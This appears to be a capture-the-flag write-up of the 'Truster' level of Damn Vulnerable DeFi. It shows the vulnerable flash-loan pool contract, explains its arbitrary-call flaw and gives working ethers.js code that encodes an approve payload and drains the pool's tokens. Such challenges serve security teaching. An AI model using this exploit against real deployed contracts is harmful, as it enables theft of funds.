@@ -1,0 +1,88 @@
+#+AUTHOR: Francesco Cannarozzo
+* Truster
+  ../Contracts/Truster.sol
+** Statement
+   pool has 1 million tokens. attacker has none. In a single transaction, attacker must steal them all.
+** Files
+*** TrusterLenderPool.sol
+**** Code
+    #+BEGIN_SRC solidity
+    // SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+/**
+ * @title TrusterLenderPool
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract TrusterLenderPool is ReentrancyGuard {
+
+    using Address for address;
+
+    IERC20 public immutable damnValuableToken;
+
+    constructor (address tokenAddress) {
+        damnValuableToken = IERC20(tokenAddress);
+    }
+
+    function flashLoan(
+        uint256 borrowAmount,
+        address borrower,
+        address target,
+        bytes calldata data
+    )
+        external
+        nonReentrant
+    {
+        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
+        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
+        
+        damnValuableToken.transfer(borrower, borrowAmount);
+        target.functionCall(data);
+
+        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
+        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
+    }
+
+}
+    #+END_SRC
+**** Breakdown
+***** State
+      only the token address is maintained, as an immutable set via the constructor at deployment.
+***** flashLoan
+      usual flashloan checks are performed.
+      _NOTICE_
+      no fee, and no checking that *borrowedAmount* is greater than zero.
+
+      in the calldata for *flashLoan*, we are able to specify a *target* address,
+      as well as *bytes calldata* data.
+
+      after transferring funds to borrower, function specified in data is called from target.
+
+      ...that's obviously it, isn't it?
+   
+** Exploit
+   since *flashLoan* allows for *anyone* to call *any* function from *any* address,
+   we should be able to just approve ourselves for any possible amount of funds,
+   calling *flashLoan* borrowing 0 ether, specifing DVT token as target, and the appropriate
+   payload.
+
+   #+BEGIN_SRC javascript
+        let ABI = [
+            "function approve(address spender, uint256 amount)"
+        ]
+        let attackerAddress = await attacker.getAddress()
+
+        let interface = new ethers.utils.Interface(ABI)
+
+        let poison = interface.encodeFunctionData("approve", [attackerAddress, TOKENS_IN_POOL])
+
+        await this.pool.flashLoan(0, attackerAddress, this.token.address, poison )
+
+        await this.token.connect(attacker).transferFrom(this.pool.address, attackerAddress, TOKENS_IN_POOL)
+
+   #+END_SRC
